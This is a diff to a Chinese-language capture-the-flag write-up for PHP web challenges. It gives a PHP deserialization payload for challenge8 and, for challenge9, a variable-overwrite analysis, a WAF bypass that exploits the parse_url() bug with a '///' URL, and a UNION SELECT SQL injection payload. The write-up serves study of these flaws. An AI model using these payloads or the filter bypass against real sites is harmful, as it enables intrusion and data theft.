@@ -54,4 +54,40 @@ PHP反序列化的一个小特性，反序列化时会忽略掉用来表示长�
 payload:`http://foobar/challenge8.php?data=O:%2B8:"just4fun":1:{s:8:"filename";s:9:"sbztz.php";}`
 
 ### challenge9:
-很明显的变量覆盖，覆盖掉$query_parts，但是有WAF不能获取数据，需要利用PHP parse_url()函数的BUG来解题([https://bugs.php.net/bug.php?id=55511](https://bugs.php.net/bug.php?id=55511))，通过`///x.php?key=value`的方式可以使其返回 False，从而达到绕过WAF的目的，
+
+漏洞挺明显的,主要是40行`parse_str($_SERVER['QUERY_STRING'])`
+导致的变量覆盖漏洞.既然存在变量覆盖漏洞,那就想办法找到在
+- `parse_str($_SERVER['QUERY_STRING'])`这句代码之前出现初始化的有用变量
+- 或者是在`parse_str($_SERVER['QUERY_STRING'])`之后出现的未初始化变量.
+
+看到第50-52行:
+```php
+ if($col) {
+        $query_parts = $col . " like '%" . $keyword . "%'";
+    }
+```
+如果`$col`为空,会导致`$query_parts`变为未初始化变量,就可以直接覆盖了.
+所以 `$query_parts`可控,可以直接导入sql语句造成注入.
+
+但是却有过滤
+```php
+function nojam_firewall(){
+    $INFO = parse_url($_SERVER['REQUEST_URI']);
+    parse_str($INFO['query'], $query);
+    $filter = ["union", "select", "information_schema", "from"];
+    foreach($query as $q){
+        foreach($filter as $f){
+            if (preg_match("/".$f."/i", $q)){
+                nojam_log($INFO);
+                die("attack detected!");
+            }
+        }
+    }
+}
+```
+需要利用PHP parse_url()函数的BUG来解题([https://bugs.php.net/bug.php?id=55511](https://bugs.php.net/bug.php?id=55511)),通过`///x.php?key=value`的方式可以使其返回 False，从而达到绕过WAF的目的
+
+最后的payload为:
+```
+///index.php?search_cols=a|b&keyword=xxxx&operator=and&query_parts=123 union select 1,2,3,flag from flag
+```
